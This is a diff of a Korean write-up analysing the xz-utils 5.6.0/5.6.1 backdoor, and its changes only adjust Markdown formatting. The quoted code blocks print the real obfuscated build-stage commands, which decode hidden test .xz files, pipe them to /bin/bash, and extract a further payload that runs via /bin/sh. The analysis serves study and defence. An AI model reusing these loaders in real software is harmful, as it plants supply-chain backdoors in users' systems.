@@ -23,11 +23,11 @@ https://salsa.debian.org/debian/xz-utils/-/blob/debian/unstable/m4/build-to-host
 https://github.com/tukaani-project/xz/releases/tag/v5.6.0
 https://github.com/tukaani-project/xz/releases/tag/v5.6.1
 
-이것은 구성의 말미에 실행될 난독화된 스크립트를 주입합니다. 이 스크립트는 레포지토리의 "test"에 있는 .xz파일들이고, 난독화 되어있습니다.
+이것은 구성의 말미에 실행될 난독화된 스크립트를 주입합니다. 이 스크립트는 레포지토리의 `test`에 있는 .xz파일들이고, 난독화 되어있습니다.
 
 이 스크립트는 실행되고, 몇 가지 선제조건과 일치하면 하부 코드
 
-```
+```bash
 am__test = bad-3-corrupt_lzma2.xz
 ...
 am__test_dir=$(top_srcdir)/tests/files/$(am__test)
@@ -39,14 +39,15 @@ sed rpath $(am__test_dir) | $(am__dist_setup) >/dev/null 2>&1
 
 이는
 
-```
+```bash
 ...; sed rpath ../../../tests/files/bad-3-corrupt_lzma2.xz | tr "	 \-_" " 	_\-" | xz -d | /bin/bash >/dev/null 2>&1; ...
 ```
 
 로 끝납니다.
 
-"| bash" 를 나오면 아래와 같은 코드를 생성합니다.
+`| bash` 를 나오면 아래와 같은 코드를 생성합니다.
 
+```bash
 ####Hello####
 #��Z�.hj�
 eval `grep ^srcdir= config.status`
@@ -56,6 +57,7 @@ srcdir="../../$srcdir"
 fi
 export i="((head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +724)";(xz -dc $srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c +31265|tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377")|xz -F raw --lzma1 -dc|/bin/sh
 ####World####
+```
 
 난독화 해제 후 이는 injected.txt로 연결됩니다.
 
